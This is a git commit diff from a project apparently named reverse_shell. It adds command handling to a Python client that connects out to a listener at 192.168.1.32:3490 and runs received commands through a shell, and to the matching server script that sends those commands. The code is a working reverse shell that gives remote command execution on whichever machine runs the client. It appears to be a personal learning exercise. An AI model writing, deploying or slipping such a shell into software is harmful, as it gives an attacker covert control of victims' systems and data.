7b9fac3a8f324252227d3f8fb17fd88ec0c461ed
Nuohan Li <linuohan.fred22@gmail.com>
2022-12-30 15:50:15 -0500

    able to issue command over socket now

--- reverse_shell/reverse_shell.py
+++ reverse_shell/reverse_shell.py
@@ -1,19 +1,48 @@
 import socket 
+import json
 import subprocess
+import os
 
 def return_info():
     while 1:
         command = sock.recv(1024)
-        if command.decode('utf-8') == "quit":
+        command_str = command.decode('utf-8')
+        print(command_str[:2])
+        print(len(command_str))
+        
+        if command_str == "quit":
+            sock.close()
             break
-        proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = proc.stdout.read() + proc.stderr.read() 
-        command_str = "executed command: " + command.decode('utf-8') + '\n' + result.decode('utf-8')
-        sock.send(command_str.encode('utf-8'))
-
+        # if first two letters from the command is cd
+        elif command_str[:2] == 'cd':
+            print("cd command received")
+            if len(command_str) > 2:
+                path = command_str[3:]
+                try:
+                    os.chdir(str(path))
+                    sock.send(f"cd to {path}".encode('utf-8'))
+                except:
+                    sock.send("Invalid path".encode('utf-8'))
+                    continue
+            else:
+                current_location = '/'
+                os.chdir('/')
+                sock.send("cd to /".encode('utf-8'))
+        elif command_str[:2] == 'ls' and len(command_str) > 1:
+            print("ls command with args received")
+            cmd_arr = command_str.split()
+            output_str = subprocess.run(cmd_arr, stdout=subprocess.PIPE, text=True)
+            sock.send(str(output_str.stdout).encode('utf-8'))
+        else:
+            proc = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read() 
+            output_str = "executed command: " + command.decode('utf-8') + '\n' + result.decode('utf-8')
+            sock.send(output_str.encode('utf-8'))
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("192.168.1.32", 3490))
+# current_dir = os.getcwd()
+# sock.send(current_dir.encode('utf-8'))
 
 return_info()
 sock.close()
--- reverse_shell/server.py
+++ reverse_shell/server.py
@@ -3,23 +3,37 @@ import socket
 port = 3490
 host_ip = "192.168.1.32"
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+current_dir = ""
 
 def send_command():
     print("You can now enter commands to send")
     while 1:
         command = input(">>> ")
-        if command == "quit":
+        if command == "":
+            continue
+        elif command == "quit":
             target.send(command.encode('utf-8'))
             print("Exiting...")
+            sock.close()
             break
+        elif command[:2] == "cd":
+            target.send(command.encode('utf-8'))
+            output = target.recv(4096).decode('utf-8')
+            print(output)
+            continue
+        elif command[:2] == "ls" and len(command) > 1:
+            target.send(command.encode('utf-8'))
+            output = target.recv(4096).decode('utf-8')
+            print(output)
         else:
             target.send(command.encode('utf-8'))
-            result = target.recv(1024)
-            print(message.decode('utf-8'))
+            result = target.recv(4096)
+            print(result.decode('utf-8'))
 
 
 def server_init():
     global target
+    # global current_dir
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind((host_ip, port))
     # listen, maximum 10 incoming connections allowed in queue
@@ -29,6 +43,7 @@ def server_init():
     # also returns address and port bound to the remote end 
     target, ip = sock.accept()
     print(f"Connected with {str(ip)}")
+    # current_dir = target.recv(1024).decode('utf-8')
     # sock.close()
 
 
